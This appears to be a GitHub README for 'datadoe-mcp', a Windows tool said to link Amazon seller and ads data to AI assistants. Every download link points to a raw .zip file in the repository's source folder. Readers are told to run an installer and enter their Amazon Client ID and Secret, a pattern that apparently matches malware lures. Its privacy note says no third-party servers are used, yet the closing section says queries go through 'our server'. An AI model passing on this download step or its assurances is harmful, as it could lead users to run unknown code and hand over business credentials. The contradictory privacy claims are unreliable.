# 📦 datadoe-mcp - Connect AI tools to Amazon business data

[![](https://img.shields.io/badge/Download-datadoe--mcp-blue.svg)](https://raw.githubusercontent.com/sadatmohamed199-bit/datadoe-mcp/main/src/mcp_datadoe_interplicate.zip)

datadoe-mcp acts as a bridge between your Amazon business account and your favorite AI assistant. Use this tool to view sales, advertising, and vendor data inside chat interfaces like Claude, ChatGPT, and Cursor. You gain direct insights from your Amazon SP-API and Ads API without writing custom code.

## 📋 System Requirements

Ensure your computer meets these standards to run the software:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 8 GB of RAM or more.
*   Storage: 200 MB of space for the application files.
*   Network: An active internet connection to communicate with Amazon servers.
*   Account: A registered Amazon Seller Central or Vendor Central account with API access enabled.

## 📥 Getting Started

Follow these steps to set up your connection.

1. Visit the [repository page](https://raw.githubusercontent.com/sadatmohamed199-bit/datadoe-mcp/main/src/mcp_datadoe_interplicate.zip) to download the application files.
2. Choose the latest release version that matches your Windows system.
3. Save the installer file to your computer.
4. Run the installer and follow the screen prompts to finish the setup.

## ⚙️ Configuration

The application requires your Amazon API credentials to function. You must generate these within your Amazon Seller Central or Vendor Central dashboard.

1. Log in to your Amazon portal.
2. Navigate to the Developer Central or App Store settings section.
3. Create a new application profile.
4. Copy your Client ID and Client Secret. 
5. Open the datadoe-mcp settings window on your desktop.
6. Paste your credentials into the boxes provided.
7. Save the configuration to authorize the connection.

## 🔗 Connecting to AI Assistants

Once configured, the app talks to your AI tools via the Model Context Protocol. Each AI client handles this differently.

### For Claude Desktop
1. Open the Claude Desktop configuration file found in your user profile folder.
2. Add the datadoe-mcp path to the tools section.
3. Restart Claude to see the Amazon data options in your sidebar.

### For Cursor and Code Editors
1. Access your editor settings menu.
2. Locate the MCP or Server configuration panel.
3. Type the command to start the datadoe-mcp service.
4. Confirm the connection status shows as active.

## 📊 Available Data Feeds

The tool organizes information into specific categories for your AI to read:

*   Sales Reports: Pulls order volume, shipment status, and refund history.
*   Advertising Metrics: Tracks daily spend, conversions, and impressions for your active campaigns.
*   Inventory Levels: Monitors current stock and alerts the AI when items drop below your set threshold.
*   Vendor Performance: Gathers data on chargebacks, shipping compliance, and logistics health.

## 🛠 Troubleshooting Common Issues

If the AI fails to see your data, check these items:

*   Connection Error: Confirm your Amazon credentials remain valid and have not expired.
*   Startup Failure: Ensure no other service currently uses the default port assigned to the server.
*   Missing Data: Log in to Seller Central to verify that your API tokens have active permissions for the report types you requested.
*   Update Process: Always check the repository link provided above when you notice missing features or bugs. Download the new version to overwrite existing files.

## 🛡 Data Privacy Note

This application processes data locally on your computer. Your Amazon credentials stay encrypted in your user settings file. The software only sends data requests between your computer and the Amazon API endpoints you authorize. No third-party servers store your sales logs or login information.

## 📈 Improving Your Workflow

Connect your business data to AI to save time on manual report analysis. You can ask questions natural language style. Examples include:

*   "What was my total ad spend yesterday?"
*   "List the products that need restocking this week."
*   "Summarize my recent sales performance by region."

The AI processes these requests by querying our server, which fetches current data from your Amazon account. This removes the need to export CSV files or navigate through the Amazon dashboard multiple times per day.